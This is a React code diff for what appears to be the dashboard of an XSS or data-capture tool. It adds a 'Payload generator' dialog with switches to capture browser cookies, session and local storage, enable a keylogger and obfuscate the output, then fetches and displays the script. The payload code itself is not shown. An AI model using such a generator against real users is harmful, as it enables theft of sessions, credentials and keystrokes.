@@ -1,5 +1,6 @@
 import ReactDOM, { render } from 'react-dom'
 import React, { Component } from "react";
+import Request from 'react-http-request';
 import PropTypes from 'prop-types';
 import { withStyles } from 'material-ui/styles';
 import classNames from 'classnames';
@@ -25,8 +26,14 @@ import Paper from 'material-ui/Paper';
 import { LinearProgress } from 'material-ui/Progress';
 import AddIcon from 'material-ui-icons/Add';
 import CloseIcon from 'material-ui-icons/Close';
+import { CircularProgress } from 'material-ui/Progress';
 import Slide from 'material-ui/transitions/Slide';
-import ReactJson from 'react-json-view'
+import ReactJson from 'react-json-view';
+import { FormControlLabel, FormGroup } from 'material-ui/Form';
+import SyntaxHighlighter from 'react-syntax-highlighter';
+import { atomOneDark } from 'react-syntax-highlighter/styles/hljs';
+import { indigo } from 'material-ui/colors';
+import Switch from 'material-ui/Switch';
 import Dialog, {
 	DialogActions,
 	DialogContent,
@@ -185,6 +192,20 @@ const styles = theme => ({
       textAlign: 'center',
     }
   },
+  code: {
+    whiteSpace: 'pre-wrap',
+    wordWrap: 'break-word',
+    maxHeight: '100%',
+    padding: '0.5em 1em !important',
+  },
+  codeDialog: {
+    background: '#282C34',
+  },
+  transparent: {
+    background: 'none !important',
+    boxShadow: 'none !important',
+    overflow: 'hidden !important',
+  },
 })
 
 class PersistentDrawer extends Component {
@@ -245,10 +266,6 @@ class PersistentDrawer extends Component {
     this.props.signOut()
   }
 
-  viewJS = () => {
-		window.open("/payload/?project=" + encodeURIComponent(this.state.currentProject.name))
-	}
-
 	viewJSON = () => {
 		window.open("/api/" + encodeURIComponent(this.props.token) + "/" + encodeURIComponent(this.state.currentProject.name) /*+ "&download=true"*/)
   }
@@ -257,25 +274,6 @@ class PersistentDrawer extends Component {
     const { classes, theme, signIn } = this.props;
     const { open } = this.state;
 
-    const drawer = (
-      <Drawer
-        type={this.props.parentState.width >= 700 ? "persistent" : ''}
-        classes={{
-          paper: classes.drawerPaper,
-        }}
-        open={open}
-        onRequestClose={this.handleDrawerClose.bind(this)}
-      >
-        <div className={classes.drawerInner}>
-          <div className={classes.drawerHeader}>
-            <IconButton onClick={this.handleDrawerClose}>
-              {theme.direction === 'rtl' ? <ChevronRightIcon /> : <ChevronLeftIcon />}
-            </IconButton>
-          </div>
-          <ProjectList p={this.props} projects={this.props.parentState.projects} projectData={this.props.parentState.project} emit={this.props.emit} classes={classes} token={this.props.token} loading={this.loading.bind(this)} closeDrawer={this.handleDrawerClose.bind(this)}/>
-        </div>
-      </Drawer>
-    )
     return (
       <div className={classes.root}>
         <div className={classes.appFrame}>
@@ -312,7 +310,23 @@ class PersistentDrawer extends Component {
             </Toolbar>
           </AppBar>
           {this.state.loading ? (<LinearProgress className={classes.loading} /> ) : null}
-          {drawer}
+          <Drawer
+            type={this.props.parentState.width >= 700 ? "persistent" : ''}
+            classes={{
+              paper: classes.drawerPaper,
+            }}
+            open={open}
+            onRequestClose={this.handleDrawerClose.bind(this)}
+          >
+            <div className={classes.drawerInner}>
+              <div className={classes.drawerHeader}>
+                <IconButton onClick={this.handleDrawerClose}>
+                  {theme.direction === 'rtl' ? <ChevronRightIcon /> : <ChevronLeftIcon />}
+                </IconButton>
+              </div>
+              <ProjectList p={this.props} projects={this.props.parentState.projects} projectData={this.props.parentState.project} emit={this.props.emit} classes={classes} token={this.props.token} loading={this.loading.bind(this)} closeDrawer={this.handleDrawerClose.bind(this)}/>
+            </div>
+          </Drawer>
           {this.state.currentProject ? (
                 <main
                   className={classNames(classes.content, classes[`content`], {
@@ -342,7 +356,7 @@ class PersistentDrawer extends Component {
                           return (
                             <TableRow key={i}>
                               <TableCell className={classes.tableCell}>
-                                <Timestamp time={record.timestamp} format='ago'/>
+                                <Timestamp time={record.timestamp} format='ago' precision={this.props.parentState.width > 750 ? 3 : this.props.parentState.width > 600 ? 2 : 1} />
                               </TableCell>
                               <TableCell className={classes.tableCell}>
                                 {record.username}
@@ -363,11 +377,7 @@ class PersistentDrawer extends Component {
                     </Table>
                   </Paper>
                   <br />
-                  <Tooltip title="Payload for this project" placement="bottom">
-                    <Button onClick={this.viewJS} color="primary">
-                      Javascript code
-                    </Button>
-                  </Tooltip>
+                  <Javascript parentState={this.state} classes={classes} />
                   <Tooltip title="Show the raw JSON database entries" placement="bottom">
                     <Button onClick={this.viewJSON} color="primary">
                       View JSON
@@ -400,7 +410,7 @@ class PersistentDrawer extends Component {
                       </AppBar>
                       <List className={classes.recordContent}>
                         <ListItem>
-                          <ListItemText primary="Timestamp" secondary={this.state.record.timestamp} />
+                          <ListItemText primary="Timestamp" secondary={<Timestamp time={this.state.record.timestamp} format='full' />} />
                         </ListItem>
                         <Divider />
                         <ListItem>
@@ -500,6 +510,206 @@ class Project extends Component {
       </ListItem>
 		)
 	}
+}
+
+class Javascript extends Component {
+  state = {
+    open: false,
+    javascriptURL: false,
+    options: {
+      cookies: true,
+      sessionStorage: true,
+      localStorage: true,
+      keylogger: false,
+      minify: true,
+      obfuscate: false,
+    }
+  }
+
+  handleClickOpen = () => {
+    this.setState({ open: true })
+  }
+
+  handleRequestClose = () => {
+    this.setState({
+      open: false
+    })
+    setTimeout(() => {
+      this.setState({
+        javascriptURL: false
+      })
+    }, 300)
+  }
+
+  componentWillMount() {
+    let savedOptions
+    try {
+      savedOptions = JSON.parse(localStorage.getItem("payload-generator"))
+    } catch(e) {
+      localStorage.setItem("payload-generator", '')
+      return
+    }
+    if (savedOptions) {
+      this.setState({ options: savedOptions})
+    }
+  }
+
+  viewJS = () => {
+    let params = ''
+    if (this.state.options.cookies == false) params += "&cookies=false"
+    if (this.state.options.localStorage == false) params += "&localStorage=false"
+    if (this.state.options.sessionStorage == false) params += "&sessionStorage=false"
+    if (this.state.options.keylogger == true) params += "&keylogger=true"
+    if (this.state.options.minify == true) params += "&minify=true"
+    if (this.state.options.obfuscate == true) params += "&obfuscate=true"
+    this.setState({
+      javascriptURL: "/payload/?project=" + encodeURIComponent(this.props.parentState.currentProject.name) + params
+    })
+    localStorage.setItem("payload-generator", JSON.stringify(this.state.options))
+  }
+
+  back = () => {
+    this.setState({
+      javascriptURL: false
+    })
+  }
+
+  raw = () => {
+    window.open(this.state.javascriptURL, '_blank')
+  }
+
+  copy = () => {
+
+  }
+
+  render() {
+    return (
+      <div>
+        <Tooltip title="Payload for this project" placement="bottom">
+          <Button onClick={this.handleClickOpen} color="primary">
+            Javascript code
+          </Button>
+        </Tooltip>  
+          {this.state.javascriptURL ? (
+            <div>              
+              <Request
+                url={this.state.javascriptURL}
+                method='get'
+                verbose={true}
+              >
+                {
+                  ({error, result, loading}) => {
+                    if (loading) {
+                      return (
+                        <Dialog open={this.state.open} classes={{ paper: this.props.classes.transparent }}>
+                          <CircularProgress size={60} style={{ color: indigo[50] }} />
+                        </Dialog>
+                      )
+                    } else {
+                      return (
+                        <div>
+                          <Dialog open={this.state.open} onRequestClose={this.handleRequestClose} classes={{ paper: this.props.classes.codeDialog}}>
+                            <SyntaxHighlighter showLineNumbers language='javascript' style={atomOneDark} height={200} className={this.props.classes.code}>
+                              {result.text}
+                            </SyntaxHighlighter>
+                            <DialogActions>
+                              <Button onClick={this.back.bind(this)} color="contrast">
+                                Back
+                              </Button>
+                              <Button onClick={this.raw.bind(this)} color="contrast">
+                                Raw
+                              </Button>
+                              {/* <Button onClick={this.copy.bind(this)} color="contrast">
+                                Copy
+                              </Button> */}
+                            </DialogActions>
+                          </Dialog>
+                        </div>
+                      )
+                    }
+                  }
+                }
+              </Request>
+            </div>
+          ) : (
+            <Dialog open={this.state.open} onRequestClose={this.handleRequestClose}>
+              <DialogTitle>Payload generator</DialogTitle>
+              <DialogContent>
+                <DialogContentText>
+                  Select the options you want your payload to have / not have
+                </DialogContentText>
+                <FormGroup>
+                  <FormControlLabel
+                    control={
+                      <Switch
+                        checked={this.state.options.keylogger}
+                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, keylogger: checked } } )}
+                      />
+                    }
+                    label="Record keystrokes (keylogger)"
+                  />
+                  <Divider inset />
+                  <FormControlLabel
+                    control={
+                      <Switch
+                        checked={this.state.options.sessionStorage}
+                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, sessionStorage: checked } } )}
+                      />
+                    }
+                    label="Capture session storage"
+                  />
+                  <FormControlLabel
+                    control={
+                      <Switch
+                        checked={this.state.options.localStorage}
+                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, localStorage: checked } } )}
+                      />
+                    }
+                    label="Capture local storage"
+                  />
+                  <FormControlLabel
+                    control={
+                      <Switch
+                        checked={this.state.options.cookies}
+                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, cookies: checked } } )}
+                      />
+                    }
+                    label="Capture browser cookies"
+                  />
+                  <Divider inset />
+                  <FormControlLabel
+                    control={
+                      <Switch
+                        checked={this.state.options.minify}
+                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, minify: checked } } )}
+                      />
+                    }
+                    label="Minify outputted javascript"
+                  />
+                  <FormControlLabel
+                    control={
+                      <Switch
+                        checked={this.state.options.obfuscate}
+                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, obfuscate: checked } } )}
+                      />
+                    }
+                    label="Obfuscate outputted javascript"
+                  />
+                </FormGroup>
+              </DialogContent>
+              <DialogActions>
+                <Button onClick={this.handleRequestClose} color="primary">
+                  Cancel
+                </Button>
+                <Button onClick={this.viewJS} color="primary">
+                  Generate
+                </Button>
+              </DialogActions>
+            </Dialog>
+          )}
+      </div>
+    )
+  }
 }
 
 PersistentDrawer.propTypes = {
